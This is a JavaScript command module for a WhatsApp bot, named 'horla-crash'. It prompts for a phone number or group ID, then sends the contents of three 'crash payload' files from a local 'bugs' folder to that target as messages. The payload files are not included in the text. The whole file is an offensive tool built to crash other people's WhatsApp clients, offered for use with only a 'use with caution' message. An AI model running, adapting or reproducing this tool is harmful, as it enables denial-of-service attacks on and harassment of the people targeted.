import fs from "fs";
import path from "path";

export default {
  name: "horla-crash",
  description: "Send all three crash payloads to a number or group.",
  async execute(msg, { sock, args }) {
    try {
      let target = args[0];

      // Ask user for target number if not provided
      if (!target) {
        await sock.sendMessage(msg.key.remoteJid, {
          text: "⚠️ Please reply with the number or group ID you want to send the crashes to."
        });

        // Wait for next message from the same user
        const collector = async (incomingMsg) => {
          if (
            incomingMsg.key.fromMe === false &&
            incomingMsg.key.remoteJid === msg.key.remoteJid
          ) {
            target = incomingMsg.message?.conversation || incomingMsg.message?.extendedTextMessage?.text;
            if (!target) return;
            await sendCrashes(target);
            sock.ev.off("messages.upsert", collector);
          }
        };

        sock.ev.on("messages.upsert", collector);
      } else {
        await sendCrashes(target);
      }

      // Function to send crash files
      async function sendCrashes(target) {
        // Format target
        if (!target.includes("@g.us") && !target.includes("@s.whatsapp.net")) {
          if (target.length < 11) {
            return await sock.sendMessage(msg.key.remoteJid, {
              text: "⚠️ Invalid number. Use format: 234XXXXXXXXXX"
            });
          }
          target = target + "@s.whatsapp.net";
        }

        const files = ["combo_invisible.txt", "mentions.json", "singleline_crash.txt"];
        for (const file of files) {
          const filePath = path.join(process.cwd(), "bugs", file);

          if (!fs.existsSync(filePath)) {
            await sock.sendMessage(msg.key.remoteJid, {
              text: `❌ ${file} not found in bugs folder.`
            });
            continue;
          }

          const payload = fs.readFileSync(filePath, "utf8");
          await sock.sendMessage(target, { text: payload });
        }

        await sock.sendMessage(msg.key.remoteJid, {
          text: `✅ All crash payloads sent to ${target}. ⚠️ Use with extreme caution!`
        });
      }

    } catch (e) {
      await sock.sendMessage(msg.key.remoteJid, {
        text: "❌ Failed to send horla-crash: " + e.message
      });
    }
  }
};
